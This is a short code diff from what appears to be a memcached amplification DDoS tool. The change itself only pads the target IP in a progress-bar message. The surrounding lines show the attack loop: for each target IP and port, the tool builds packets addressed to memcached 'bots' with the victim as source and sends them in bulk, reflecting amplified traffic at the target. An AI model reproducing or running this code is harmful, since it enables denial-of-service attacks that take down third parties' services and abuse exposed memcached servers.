@@ -123,7 +123,7 @@ def crash(targets, num_packets, bots_config, repeat, logo):
         for ip, port in targets:
             with tqdm(total=n_bots*num_packets) as progress:
                 for bot in bots:
-                    progress.set_description(f"==> [{loop}] targeting {ip}:{port} -- {bot: <16}")
+                    progress.set_description(f"==> [{loop}] targeting {ip: >16}:{port} -- {bot: <16}")
                     packet = prepare_packet(dest_ip=bot, dest_port=MEMCACHED_PORT, target_ip=ip, target_port=port)
                     send(packet, count=num_packets, verbose=False)
                     progress.update(num_packets)
